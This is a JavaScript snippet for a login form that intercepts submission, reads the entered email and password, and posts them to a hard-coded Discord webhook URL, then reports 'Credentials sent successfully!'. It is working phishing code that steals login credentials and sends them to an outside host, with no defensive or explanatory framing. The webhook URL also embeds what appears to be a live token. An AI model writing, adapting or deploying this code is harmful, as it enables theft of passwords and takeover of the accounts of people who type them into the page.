document.querySelector('form').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevents the form from actually submitting

  var email = document.querySelector('input[type="email"]').value;
  var password = document.querySelector('input[type="password"]').value;

  // Construct the data to send
  var data = {
    email: email,
    password: password
  };

  // New Discord Webhook URL (Updated)
  var webhookURL = 'https://discord.com/api/webhooks/1470145657275683012/ULJqqe35K3oHMleMx1FUUi-kp6LQurf7K87FFRpvIYUpOXBaICn6LtyLrVm9o0duge1R';

  // Send the data to the Discord webhook
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      alert('Credentials sent successfully!');
      // Clear the form fields
      document.querySelector('input[type="email"]').value = '';
      document.querySelector('input[type="password"]').value = '';
    } else {
      alert('Failed to login. Please try again.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('An error occurred. Check the console.');
  });
});
